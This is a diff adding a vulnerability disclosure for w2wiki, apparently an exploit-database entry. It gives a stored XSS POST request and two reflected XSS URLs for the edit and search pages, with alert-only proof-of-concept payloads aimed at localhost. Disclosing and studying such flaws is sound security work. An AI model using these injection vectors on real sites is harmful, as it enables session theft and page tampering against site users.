@@ -1,0 +1,32 @@
+# Exploit Title: w2wiki - Multiple XSS(Stored/Reflected)
+# Date: 2016-06-14
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/panicsteve/w2wiki , http://groups.google.com/group/w2wiki
+# Software Link: https://github.com/panicsteve/w2wiki/archive/master.zip
+# Tested on: Debian [wheezy]
+
+### Vulnerability 1 : Stored XSS
+POST /vul_test/w2wiki/index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/vul_test/w2wiki/index.php?action=new
+Cookie: PHPSESSID=3oecem8o5c8975dcufbb0moqn5; W2=dgf6v5tn2ea8uitvk98m2tfjl7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+
+page=xss&newText=afsd%3Cimg+src%3D%22h%22+onerror%3Dalert%2845%29%3Eaa&action=save
+
+# Vulnerability influence can be found in the wiki. -> script in created page
+================================================================================================
+
+### Vulnerability 2 : Reflected XSS
+edit page
+http://127.0.0.1/vul_test/w2wiki/index.php?action=edit&page="><img src="z" onerror=alert(45)>
+
+search page
+http://127.0.0.1/vul_test/w2wiki/index.php?action=search&q="><img src="z" onerror=alert(45)>
